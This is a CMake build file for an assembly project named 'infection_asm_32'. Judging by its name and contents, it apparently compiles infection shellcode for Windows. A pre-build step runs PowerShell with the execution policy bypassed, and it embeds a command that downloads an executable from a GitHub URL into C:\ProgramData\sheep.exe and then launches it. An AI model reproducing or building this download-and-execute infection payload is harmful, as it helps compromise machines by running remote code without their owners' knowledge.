cmake_minimum_required(VERSION 3.15)

if(NOT CMAKE_GENERATOR_PLATFORM STREQUAL "Win32")
  message(FATAL_ERROR "This must be built with a Win32 target.")
endif()

set(CMAKE_ASM_NASM_OBJECT_FORMAT win32)
project(infection_asm_32 C ASM_NASM) # the C is to include the msvc linker
add_executable(infection_asm_32 main.asm)
add_custom_command(TARGET infection_asm_32
  PRE_BUILD
  COMMAND powershell ARGS
  -ExecutionPolicy bypass
  -File "${CMAKE_CURRENT_SOURCE_DIR}/strings.ps1"
  -launch_command "C:\\ProgramData\\sheep.exe"
  -download_command "powershell -ExecutionPolicy bypass \
-Command \"(New-Object System.Net.WebClient).DownloadFile(\
'https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe', 'C:\\ProgramData\\sheep.exe')\""
  -output "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection_strings.asm"
  VERBATIM)

target_link_options(infection_asm_32 PUBLIC "LINKER:/ENTRY:main")
target_include_directories(infection_asm_32 PUBLIC
  "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>")
